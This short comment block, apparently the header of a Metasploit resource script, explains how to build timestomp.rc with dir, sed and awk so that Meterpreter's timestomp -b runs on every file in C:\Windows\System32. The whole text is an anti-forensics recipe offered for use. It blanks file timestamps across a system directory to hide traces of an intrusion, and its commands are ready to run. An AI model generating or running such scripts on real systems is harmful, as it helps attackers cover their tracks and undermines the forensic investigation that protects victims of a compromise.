# timestomp.rc was created using sed and awk on the output of a windows directory listing
# It is a metasploit resource script which will perform -b on all files in C:\Windows\System32\
# The format of each timestomp command is:
#       timestomp [filename] -b
# It has a runtime of O(n)
# To create timestomp.rc:
#   1. run a directory listing
#       dir > listing.out
#   2. delete any lines in the listing not containing files
#       sed -i '/DIR/d' listing.out
#   3. print out only the filenames
#       awk '{print $5}' listing.out > filenames.txt
#   4. prepend files with 'timestomp' and 'append with -b'
#       sed '-e s/^/timestomp /' '-e s/$/ -b/' filenames.txt > timestomp.rc
#   5. delete any extra lines
